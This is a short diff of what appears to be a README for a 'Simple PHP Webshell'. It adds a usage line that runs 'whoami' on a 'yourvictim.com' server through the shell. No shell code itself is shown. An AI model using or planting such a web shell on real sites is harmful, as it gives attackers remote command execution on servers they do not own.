@@ -1,7 +1,9 @@
 Simple PHP Webshell
 -------------------
+usage: http://www.yourvictim.com/shellname.php?cmd=whoami
 
 ```html
+html
 <html>
  <head>
   <title>PHP Test</title>
